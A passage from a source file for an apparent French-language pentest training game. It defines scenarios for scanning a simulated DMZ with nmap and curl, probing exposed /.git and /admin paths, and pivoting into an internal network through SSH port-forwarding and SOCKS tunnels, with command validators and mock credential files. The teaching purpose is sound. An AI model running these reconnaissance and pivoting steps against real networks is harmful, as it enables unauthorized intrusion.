        id: 2,
        title: "Scan et exploitation DMZ",
        context: "La DMZ est accessible depuis ton VLAN. Scanne-la et identifie un service exploitable.",
        objective: "Scanner la DMZ et trouver un service vulnérable ou mal configuré",
        hints: [
          "`nmap -sV 10.40.40.10` — versions des services en DMZ.",
          "`curl -I http://10.40.40.10` — headers HTTP révèlent la stack.",
          "Teste `/admin`, `/.git`, `/phpinfo.php` — souvent oubliés en DMZ."
        ],
        validation: [
          { type: 'command', value: 'nmap -sV 10.40.40', description: 'Scanner les services en DMZ' },
          { type: 'command', value: 'curl -I http://10.40.40', description: 'Énumérer le service web DMZ' }
        ],
        fileSystem: {
          'dmz_findings.txt': `Résultats scan DMZ :
  10.40.40.10 : Apache/2.4.29 (Ubuntu) — PHP/7.2
    Port 80  : OPEN — Site web
    Port 22  : OPEN — OpenSSH 7.6
  10.40.40.20 : Postfix mail
  10.40.40.30 : BIND DNS 9.11 (potentiellement zone transfer)`
        }
      },
      {
        id: 3,
        title: "Pivot DMZ → Réseau serveurs",
        context: "Tu as un accès SSH sur 10.40.40.10 (via backdoor ou credential trouvé). Pivote vers 10.20.20.0/24.",
        objective: "Créer un tunnel SSH depuis la DMZ pour accéder au réseau serveurs interne",
        hints: [
          "`ssh -L 8080:10.20.20.5:80 www-data@10.40.40.10 -N` — accès au serveur interne via localhost:8080.",
          "`ssh -D 9050 www-data@10.40.40.10 -N` — proxy SOCKS5 pour tout le réseau interne.",
          "Avec SOCKS : `curl --socks5 127.0.0.1:9050 http://10.20.20.5` — accès au LAN interne."
        ],
        validation: [
          { type: 'command', value: 'ssh -L', description: 'Créer un tunnel SSH depuis la DMZ' },
          { type: 'command', value: 'ssh -D', description: 'Mettre en place un proxy SOCKS via le pivot' }
        ],
        fileSystem: {
          'pivot_creds.txt': `Credentials récupérés sur le serveur web DMZ :
  Fichier : /var/www/html/config.php
  SSH user : www-data
  Clé SSH  : /var/www/.ssh/id_rsa (présente dans le dépôt git exposé)

Commande pivot :
  ssh -i id_rsa -D 9050 www-data@10.40.40.10 -N &
  curl --socks5 127.0.0.1:9050 http://10.20.20.5`
        }
      }
    ]
  }
];

export const getScenarioCategoryLabel = (category: Scenario['category']): string => {
  switch (category) {
    case 'forensic': return 'Forensic Linux';
    case 'reseau':   return 'Réseau';
    case 'systeme':  return 'Système';
    case 'hacking':  return 'Hacking';
    case 'pentest':  return 'Pentest';
    default: return category;
  }
};

export const getScenarioCategoryColor = (category: Scenario['category']): string => {
  switch (category) {
    case 'forensic': return 'text-orange-400 border-orange-400/20';
    case 'reseau':   return 'text-blue-400 border-blue-400/20';
    case 'systeme':  return 'text-[#a3e635] border-[#a3e635]/20';
    case 'hacking':  return 'text-red-400 border-red-400/20';
    case 'pentest':  return 'text-purple-400 border-purple-400/20';
    default: return 'text-gray-400 border-gray-400/20';
  }
};

export const getScenarioCategoryIcon = (category: Scenario['category']): string => {
  switch (category) {
    case 'forensic': return '🔬';
    case 'reseau':   return '🛰️';
    case 'systeme':  return '⚙️';
    case 'hacking':  return '🔓';
    case 'pentest':  return '🎯';
    default: return '📌';
  }
};
